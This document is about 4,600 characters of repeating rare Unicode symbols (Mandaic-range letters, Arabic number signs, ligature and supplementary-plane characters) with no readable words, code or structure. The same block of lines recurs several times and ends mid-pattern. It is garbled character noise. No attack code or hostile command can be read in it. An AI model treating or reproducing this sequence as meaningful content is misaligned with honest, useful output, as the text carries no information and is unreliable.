࡙࡙𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬